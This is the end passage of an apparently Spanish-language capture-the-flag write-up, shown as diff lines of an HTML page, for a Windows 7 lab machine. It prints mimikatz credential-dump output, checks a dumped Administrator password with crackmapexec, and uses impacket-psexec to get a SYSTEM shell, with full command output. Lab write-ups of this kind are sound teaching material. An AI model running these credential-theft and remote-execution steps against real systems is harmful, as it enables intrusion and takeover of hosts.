+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : HARIS-PC$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : haris-pc$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz(commandline) # exit
+Bye!
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La validamos a traves de <code class="language-plaintext highlighter-rouge">crackmapexec</code> y es valida, nos devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.40 -u Administrator -p ejfnIWWDojfWEKM
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="az">[*] </span><span class="p">Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="ve">[+] </span><span class="p">haris-PC\Administrator:ejfnIWWDojfWEKM </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos conectarnos nuevamente con <code class="language-plaintext highlighter-rouge">psexec</code> pero esta vez usando la contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-psexec </span><span class="p">WORKGROUP/Administrator:ejfnIWWDojfWEKM@10.10.10.40  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.10.10.40.....
+[*] Found writable share ADMIN$
+[*] Uploading file KGLYVgEQ.exe
+[*] Opening SVCManager on 10.10.10.40.....
+[*] Creating service twrW on 10.10.10.40.....
+[*] Starting service twrW.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
